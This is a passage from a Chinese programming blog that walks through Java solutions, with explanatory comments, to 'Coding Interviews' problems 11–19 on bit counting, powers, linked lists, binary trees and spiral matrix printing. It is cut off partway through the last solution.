title="标签：【数学】"></a>标签：【数学】</h4><h4 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个整数，输出该数32位二进制表示中1的个数。其中负数用补码表示。</p></blockquote><h4 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">NumberOf1</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果一个整数不为0，那么这个整数至少有一位是1。如果我们把这个整数减1，那么原来处在整数最右边的1         //就会变为0，原来在1后面的所有的0都会变成1(如果最右边的1后面还有0的话)。其余所有位将不会受到影         //响。也就是说，把一个整数减去1，再和原整数做与运算，会把该整数最右边一个1变成0.那么一个整数的二         //进制有多少个1，就可以进行多少次这样的操作。(很像CSAPP里的各种技巧啊)</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="12-数值的整数次方"><a href="#12-数值的整数次方" class="headerlink" title="12.数值的整数次方"></a>12.数值的整数次方</h3><h4 id="标签：【数学】-1"><a href="#标签：【数学】-1" class="headerlink" title="标签：【数学】"></a>标签：【数学】</h4><h4 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。</p><p>保证base和exponent不同时为0</p></blockquote><h4 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">Power</span><span class="params">(<span class="keyword">double</span> base, <span class="keyword">int</span> exponent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (base == <span class="number">0.0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> base;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//不直接用JDK自带的函数了</span></span><br><span class="line">        <span class="keyword">double</span> res = <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">int</span> e = exponent &gt; <span class="number">0</span> ? exponent : -exponent;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e; i++) &#123;</span><br><span class="line">            res = res * base;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> exponent &gt; <span class="number">0</span> ? res : <span class="number">1</span> / res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="13-调整数组顺序使奇数位于偶数前面"><a href="#13-调整数组顺序使奇数位于偶数前面" class="headerlink" title="13.调整数组顺序使奇数位于偶数前面"></a>13.调整数组顺序使奇数位于偶数前面</h3><h4 id="标签：【数组】"><a href="#标签：【数组】" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。</p></blockquote><h4 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reOrderArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array == <span class="keyword">null</span> || array.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//存放奇数的队列</span></span><br><span class="line">        Queue&lt;Integer&gt; queue1 = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        <span class="comment">//存放偶数的队列</span></span><br><span class="line">        Queue&lt;Integer&gt; queue2 = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (array[i] % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                queue1.add(array[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                queue2.add(array[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (queue1.size() != <span class="number">0</span>) &#123;</span><br><span class="line">            array[j++] = queue1.remove();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (queue2.size() != <span class="number">0</span>) &#123;</span><br><span class="line">            array[j++] = queue2.remove();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="14-链表中倒数第k个结点"><a href="#14-链表中倒数第k个结点" class="headerlink" title="14.链表中倒数第k个结点"></a>14.链表中倒数第k个结点</h3><h4 id="标签：【链表】-1"><a href="#标签：【链表】-1" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个链表，输出该链表中倒数第k个结点。</p></blockquote><h4 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class ListNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    ListNode next = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">FindKthToTail</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || k &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//常规做法是使用快慢指针，这里用优先级队列来实现复习一下（性能比快慢指针差些）</span></span><br><span class="line">        Queue&lt;Integer&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(Collections.reverseOrder());</span><br><span class="line">        Map&lt;Integer, ListNode&gt; temp = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        ListNode curr = head;</span><br><span class="line">        <span class="keyword">while</span> (curr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            temp.put(i, curr);</span><br><span class="line">            queue.add(i);</span><br><span class="line">            curr = curr.next;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; k - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            queue.remove();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp.get(queue.peek());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="15-反转链表"><a href="#15-反转链表" class="headerlink" title="15.反转链表"></a>15.反转链表</h3><h4 id="标签：【链表】-2"><a href="#标签：【链表】-2" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个链表，反转链表后，输出新链表的表头。</p></blockquote><h4 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class ListNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    ListNode next = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">ReverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//3个指针:1）pre指针指向已经反转好的链表的最后一个结点，最开始没有反转，所以指向null; 2）cur           //指针指向待反转链表的第一个结点，最开始第一个结点待反转，所以指向head;3）nex指针指向待反转链表         //的第二个结点，目的是保存链表，因为cur改变指向后，后面的链表则失效了，所以需要保存。然后调整各结         //点的next指向就可以了。</span></span><br><span class="line">        ListNode pre;</span><br><span class="line">        ListNode cur;</span><br><span class="line">        ListNode next;</span><br><span class="line">        pre = <span class="keyword">null</span>;</span><br><span class="line">        cur = head;</span><br><span class="line">        next = head;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            next = cur.next;</span><br><span class="line">            cur.next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="16-合并两个排序的链表"><a href="#16-合并两个排序的链表" class="headerlink" title="16.合并两个排序的链表"></a>16.合并两个排序的链表</h3><h4 id="标签：【链表】-3"><a href="#标签：【链表】-3" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。</p></blockquote><h4 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class ListNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    ListNode next = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">Merge</span><span class="params">(ListNode list1, ListNode list2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//哨兵结点，保证每个结点都有前驱结点</span></span><br><span class="line">        ListNode head = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">        ListNode curr = head;</span><br><span class="line">        <span class="keyword">while</span> (list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (list1.val &lt; list2.val) &#123;</span><br><span class="line">                curr.next = list1;</span><br><span class="line">                list1 = list1.next;</span><br><span class="line">                curr = curr.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                curr.next = list2;</span><br><span class="line">                list2 = list2.next;</span><br><span class="line">                curr = curr.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (list1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            curr.next = list2;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (list2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            curr.next = list1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="17-树的子结构"><a href="#17-树的子结构" class="headerlink" title="17.树的子结构"></a>17.树的子结构</h3><h4 id="标签：【二叉树】【树】"><a href="#标签：【二叉树】【树】" class="headerlink" title="标签：【二叉树】【树】"></a>标签：【二叉树】【树】</h4><h4 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构）</p></blockquote><h4 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> * int val = 0;</span></span><br><span class="line"><span class="comment"> * TreeNode left = null;</span></span><br><span class="line"><span class="comment"> * TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment"> * this.val = val;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">HasSubtree</span><span class="params">(TreeNode root1, TreeNode root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="keyword">null</span> || root2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//两棵树根结点相等则判断是否B是A的子结构</span></span><br><span class="line">        <span class="keyword">if</span> (root1.val == root2.val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (judge(root1, root2)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//否则判断B是否是A的左子树的子结构或者右子树的子结构</span></span><br><span class="line">        <span class="keyword">return</span> HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">judge</span><span class="params">(TreeNode root1, TreeNode root2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//B树遍历完了，则说明B是A的子结构</span></span><br><span class="line">        <span class="keyword">if</span> (root2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//B树还没有遍历完，A树就遍历完了，则B树肯定不是A树的子结构</span></span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//当两树根结点相等时，继续递归判断A的左子树跟B的左子树，A的右子树跟B的右子树是否也满足这种子结构         //关系</span></span><br><span class="line">        <span class="keyword">if</span> (root1.val == root2.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> judge(root1.left, root2.left) &amp;&amp; judge(root1.right, root2.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//只要当前树的根结点不相等，就说明在当前跟结点下B不是A的子结构了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="18-二叉树的镜像"><a href="#18-二叉树的镜像" class="headerlink" title="18.二叉树的镜像"></a>18.二叉树的镜像</h3><h4 id="标签：【树】-1"><a href="#标签：【树】-1" class="headerlink" title="标签：【树】"></a>标签：【树】</h4><h4 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>操作给定的二叉树，将其变换为源二叉树的镜像。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入描述:</span><br><span class="line">&gt; 二叉树的镜像定义：源二叉树 </span><br><span class="line">&gt;         8</span><br><span class="line">&gt;        /  \</span><br><span class="line">&gt;       6   10</span><br><span class="line">&gt;      / \  / \</span><br><span class="line">&gt;     5  7 9 11</span><br><span class="line">&gt;     镜像二叉树</span><br><span class="line">&gt;         8</span><br><span class="line">&gt;        /  \</span><br><span class="line">&gt;       10   6</span><br><span class="line">&gt;      / \  / \</span><br><span class="line">&gt;     11 9 7  5</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="代码-17"><a href="#代码-17" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> * int val = 0;</span></span><br><span class="line"><span class="comment"> * TreeNode left = null;</span></span><br><span class="line"><span class="comment"> * TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment"> * this.val = val;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Mirror</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左右子树依次从上到下调整</span></span><br><span class="line">        TreeNode temp = root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = temp;</span><br><span class="line">        Mirror(root.left);</span><br><span class="line">        Mirror(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="19-顺时针打印矩阵"><a href="#19-顺时针打印矩阵" class="headerlink" title="19.顺时针打印矩阵"></a>19.顺时针打印矩阵</h3><h4 id="标签：【数组】-1"><a href="#标签：【数组】-1" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下4 X 4矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10.</p></blockquote><h4 id="代码-18"><a href="#代码-18" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*没啥技巧，考虑周全即可</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">printMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (matrix == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> totalrows = matrix.length;</span><br><span class="line">        <span class="keyword">int</span> totalcols = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> startrow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> startcol = <span class="number">0</span>;</span><br><span class="line">        ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (count &lt; matrix.length * matrix[<span class="number">0</span>].length) &#123;</span><br><span class="line">            count = count + (<span class="number">2</span> * totalcols + <span class="number">2</span> * (totalrows - <span class="number">2</span>));</span><br><span class="line">            <span class="keyword">if</span> (totalcols == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; totalrows; i++) &#123;</span><br><span class="line">                    res.add(matrix[startrow++][startcol]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (totalrows == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; totalcols; i++) &#123;</span><br><span class="line">                    res.add(matrix[startrow][startcol++]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print(matrix, startrow++, startcol++, totalrows, totalcols, res);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            totalrows -= <span class="number">2</span>;</span><br><span class="line">            totalcols -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  